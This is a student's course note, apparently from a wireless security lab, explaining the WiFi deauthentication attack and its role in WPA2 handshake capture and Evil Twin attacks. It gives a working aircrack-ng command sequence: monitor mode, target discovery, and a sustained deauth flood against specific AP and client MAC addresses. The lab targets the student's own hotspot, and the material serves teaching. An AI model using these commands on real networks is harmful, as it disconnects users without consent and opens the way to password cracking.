# Wireless Injection: Deauthentication Attack
- The Deauthentication Attack which is an attack of type **DoS** that targets the communication between a WiFi client and the WiFi AP or Router. (**see [[Wireless Security]] for more info**)
- The IEEE 802.11 protocol defines a special management frame called deauthentication frame which is sent by the AP to a station as a sanction technique to inform the station it has to disconnect from the network immediately.
- **The deauthentication attack works on [[WPA2]] despite encryption.**


> [!NOTE] Why? What's the purpose?
> - **Deauthentication attack is the first step of other attacks like:**
> 	- Cracking the [[WPA2]] Password by capturing the WPA2 4-Way Handshake by forcing the user to reconnect to the network.
> 	- Forcing the users to connect to the hacker’s rogue AP (***Evil Twin Attack***).


## Playing around with it
==*(More details in moodle files: **Sniffing WiFi Traffic** and **Deauthentication Attack**)*==
See: [[Wifi monitor mode]] and [[Sniffing WiFI Traffic]]
1. Setup a hotspot connection
2. Connect your laptop and your Virtual Machine to the hotspot
3. Perform Deauthentication attack in Virtual Machine to disconnect Wi-Fi in your laptop

#### Commands - Deauthentication Attack
```shell
########################## 
## WiFi Deauthentication Attack 
########################## 

# 1. Put the WiFi interface into monitor mode
iwconfig # -> check the interface name 
airmon-ng check kill 
airmon-ng start wlan0 
iwconfig # -> testing the mode of operation 

# 2. Identify the network and the target 
airodump-ng -i wlan0mon 

airodump-ng -i wlan0mon --bssid 34:2C:C4:93:45:97 -c 1 # -> narrow down the result
# If nothing is shown, disable 5GHz. In Device Manager, right-click on the Intel card and select Properties 

# Then click on the Advanced tab. 

# You will see an option called Wireless mode. Set the mode from 802.11a/b/g to just 802.11b/g. 

# This will prevent the card from scanning or accessing the 5Ghz 802.11a band and just leave you with the 2.4Ghz b/g band to work with. 

# 3. Launching the deauthentication attack 
aireplay-ng --test wlan0mon # -> testing injection 
aireplay-ng --deauth 999999 -a 34:2C:C4:93:45:97 -c b4:c4:fc:67:57:08 wlo1mon 

# --deauth -> no. of deauth frames to send (0 means continuously) 
# -a -> MAC address of the AP 
# -c -> MAC address of the client to deauthenticate
```
